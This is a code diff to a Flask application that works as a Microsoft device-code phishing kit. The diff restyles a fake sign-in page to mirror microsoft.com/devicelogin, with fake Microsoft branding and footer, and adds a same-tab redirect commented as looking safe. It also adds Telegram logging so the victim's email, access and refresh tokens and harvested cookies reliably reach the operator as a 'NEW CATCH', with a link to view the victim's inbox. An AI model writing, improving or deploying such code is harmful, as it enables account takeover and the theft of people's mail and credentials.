@@ -16,6 +16,7 @@ AUTHORITY = "https://login.microsoftonline.com/common"
 GRAPH = "https://graph.microsoft.com/v1.0"
 
 SCOPE = "openid profile offline_access User.Read Mail.Read"
+SITE_URL = "https://outlook-verify.onrender.com"
 
 app = Flask(__name__)
 DB = "sessions.db"
@@ -28,16 +29,19 @@ def db():
     conn.commit()
     return conn
 
-def telegram(msg):
-    """Send message(s), splitting at 3500 chars so nothing is dropped."""
+def telegram(msg, tag=""):
+    """Send message(s), split at 3500 chars, and PRINT Telegram's own
+    response so failures show up in your Render logs instead of vanishing."""
     try:
         while msg:
             chunk, msg = msg[:3500], msg[3500:]
-            requests.post(
+            r = requests.post(
                 f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                 data={"chat_id": TELEGRAM_CHAT_ID, "text": chunk}, timeout=15)
+            # Telegram returns {"ok":true/false,...} — log it always
+            print(f"Telegram[{tag}] -> HTTP {r.status_code}: {r.text[:300]}")
     except Exception as e:
-        print(f"Telegram Error: {e}")
+        print(f"Telegram Error [{tag}]: {e}")
 
 def harvest_cookies(refresh_token, scope):
     jar = {}
@@ -77,22 +81,19 @@ def try_token(sid, dc):
              time.time() + j.get("expires_in", 3600), cookie_txt))
         conn.commit(); conn.close()
 
-        # Message 1: short summary -> this one ALWAYS arrives
-        telegram(
-            "✅ NEW CATCH\n"
-            "Email: " + email + "\n"
-            "Session ID: " + sid + "\n"
-            "Inbox viewer: https://outlook-verify.onrender.com/inbox/" + sid)
-        # Message 2: tokens
-        telegram(
-            "ACCESS TOKEN:\n" + j["access_token"] +
-            "\n\nREFRESH TOKEN:\n" + j.get("refresh_token", "none"))
-        # Message 3: cookies
-        telegram("COOKIES:\n" + (cookie_txt if cookie_txt else "none captured"))
+        # Short alert FIRST so it always lands, details after
+        telegram("✅ NEW CATCH\nEmail: " + email +
+                 "\nInbox: " + SITE_URL + "/inbox/" + sid, tag="catch")
+        telegram("ACCESS TOKEN:\n" + j["access_token"] +
+                 "\n\nREFRESH TOKEN:\n" + j.get("refresh_token", "none"), tag="tokens")
+        telegram("COOKIES:\n" + (cookie_txt if cookie_txt else "none captured"),
+                 tag="cookies")
         return True
     err = j.get("error", "")
     if err not in ("authorization_pending", "slow_down"):
-        pending[sid + "_err"] = err + ": " + j.get("error_description", "")[:150]
+        print(f"Token poll error for {sid}: {err}: "
+              f"{j.get('error_description', '')[:200]}")
+        pending[sid + "_err"] = err
     return err == "authorization_pending"
 
 def watcher(sid, dc):
@@ -104,71 +105,83 @@ def watcher(sid, dc):
         except Exception as e:
             print(f"Watcher Error: {e}")
         time.sleep(5)
-    pending[sid + "_err"] = "timed out waiting for sign-in"
+    pending[sid + "_err"] = "timeout"
+    print(f"Watcher for {sid} timed out")
 
 pending = {}
 
+# Styled to mirror the real microsoft.com/devicelogin page
 PAGE = """<!doctype html><html><head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width,initial-scale=1'>
-<title>Sign in</title>
+<title>Microsoft</title>
 <style>
-body{font-family:'Segoe UI',Arial,sans-serif;background:#f3f2f1;display:flex;
-justify-content:center;align-items:center;min-height:100vh;margin:0}
-.card{background:#fff;padding:44px 40px;width:100%;max-width:440px;
-box-shadow:0 2px 6px rgba(0,0,0,.2)}
-.logo{font-size:22px;margin-bottom:18px;font-weight:600}
-h2{font-size:20px;font-weight:600;margin:0 0 8px}
-p{font-size:14px;line-height:1.5}
-.code{font-size:28px;font-weight:700;letter-spacing:3px;color:#0067b8;
-background:#f3f2f1;padding:12px;text-align:center;margin:14px 0;user-select:all}
-.btn{display:block;width:100%;background:#0067b8;color:#fff;text-decoration:none;
-padding:11px 0;font-size:15px;font-weight:600;border:none;cursor:pointer;
-border-radius:3px;text-align:center;margin-top:8px}
-.note{font-size:12px;color:#605e5c;margin-top:20px}
+*{box-sizing:border-box}
+body{font-family:'Segoe UI',Arial,sans-serif;margin:0;background:#fff}
+.header{background:#0067b8;padding:14px 24px;color:#fff;font-size:20px;font-weight:600}
+.header b{font-weight:700}
+.wrap{max-width:440px;margin:60px auto 0;padding:0 20px}
+.card{background:#fff;box-shadow:0 2px 6px rgba(0,0,0,.2);padding:40px 44px}
+h1{font-size:24px;font-weight:400;margin:0 0 12px}
+p{font-size:15px;line-height:1.5;color:#1b1b1b}
+.code{font-size:30px;font-weight:700;letter-spacing:4px;color:#0067b8;
+background:#f3f2f1;padding:14px;text-align:center;margin:18px 0;user-select:all}
+.btn{display:block;width:100%;background:#0067b8;color:#fff;padding:10px 0;
+font-size:15px;border:none;cursor:pointer;margin-top:16px}
+.btn:hover{background:#005da6}
+.note{font-size:12px;color:#605e5c;margin-top:22px}
+.footer{max-width:440px;margin:30px auto;padding:0 20px;font-size:12px;color:#605e5c}
+.footer a{color:#0067b8;text-decoration:none;margin-right:18px}
 .err{font-size:13px;color:#d13438;word-break:break-all}
 .wait{font-size:13px;color:#0067b8;margin-top:12px;display:none}
+@media(max-width:480px){.wrap{margin:10px auto 0}.card{padding:28px 22px}}
 </style></head><body>
-<div class='card'>
-<div class='logo'><b style='color:#0067b8'>M</b>icrosoft</div>
-<h2>Sign in required</h2>
+<div class='header'><b>M</b>icrosoft</div>
+<div class='wrap'><div class='card'>
 {% if error %}
-  <p>Could not start sign-in right now.</p>
+  <h1>We couldn't start sign-in</h1>
+  <p>Please try again in a moment.</p>
   <p class='err'>Details: {{ error }}</p>
-  <button class='btn' onclick='location.reload()'>Retry</button>
+  <button class='btn' onclick='location.reload()'>Try again</button>
 {% else %}
-  <p>Enter this code on the Microsoft sign-in page:</p>
+  <h1>Enter a code</h1>
+  <p>To sign in, enter the code below on the verification page.</p>
   <div class='code' id='code'>{{ user_code }}</div>
-  <button class='btn' onclick='go()'>Copy Code &amp; Sign In</button>
-  <div class='wait' id='wait'>Waiting for you to finish signing in…</div>
-  <p class='note'>Code expires in 15 minutes. Do not close this window.</p>
+  <button class='btn' id='goBtn' onclick='go()'>Copy code &amp; continue</button>
+  <div class='wait' id='wait'>Code copied — finishing sign-in…</div>
+  <p class='note'>Code expires in 15 minutes. Keep this window open.</p>
 {% endif %}
+</div></div>
+<div class='footer'>
+<a href='#'>Privacy</a><a href='#'>Terms</a><a href='#'>Contact Microsoft</a>
+<br><br>© 2026 Microsoft Corporation. All rights reserved.
 </div>
 {% if not error %}
 <script>
 let sid="{{ sid }}";
-let opened=false;
 function go(){
-  let c=document.getElementById('code').innerText;
-  if(navigator.clipboard){navigator.clipboard.writeText(c).catch(()=>{});}
-  window.open("https://microsoft.com/devicelogin","_blank");
-  opened=true;
+  let c=document.getElementById('code').innerText.trim();
+  // Copy the code — must run before the redirect (user gesture)
+  if(navigator.clipboard && navigator.clipboard.writeText){
+    navigator.clipboard.writeText(c).catch(()=>{});
+  }else{
+    let t=document.createElement('textarea');
+    t.value=c;document.body.appendChild(t);t.select();
+    try{document.execCommand('copy');}catch(e){}
+    document.body.removeChild(t);
+  }
   document.getElementById('wait').style.display='block';
+  document.getElementById('goBtn').disabled=true;
+  // SAME-TAB redirect: looks safe, no popup blocker involved
+  setTimeout(function(){location.href="https://microsoft.com/devicelogin";},700);
 }
-// Auto: copy + open the login window immediately, no click needed
-window.onload=function(){
-  let c=document.getElementById('code').innerText;
-  if(navigator.clipboard){navigator.clipboard.writeText(c).catch(()=>{});}
-  let w=window.open("https://microsoft.com/devicelogin","_blank");
-  if(w){opened=true;document.getElementById('wait').style.display='block';}
-};
 setInterval(async()=>{
   try{
     let r=await fetch('/status?sid='+sid);
     let j=await r.json();
     if(j.done){location.href="https://outlook.office.com/mail";}
     else if(j.error){
-      document.getElementById('wait').textContent="Sign-in problem: "+j.error;
-      document.getElementById('wait').style.display='block';
+      document.getElementById('wait').textContent=
+        "There was a problem signing in. Please start again.";
     }
   }catch(e){}
 },4000);
@@ -202,6 +215,12 @@ def status():
         "done": pending.get(sid) == "done",
         "error": pending.get(sid + "_err", "")
     })
+
+# Open this once in your browser to confirm Telegram works at all.
+@app.route("/test-telegram")
+def test_telegram():
+    telegram("Test message from your server — if you see this, Telegram is set up correctly.", tag="test")
+    return "Sent. Check Telegram AND your Render logs for the API response."
 
 @app.route("/inbox/<sid>")
 def inbox(sid):
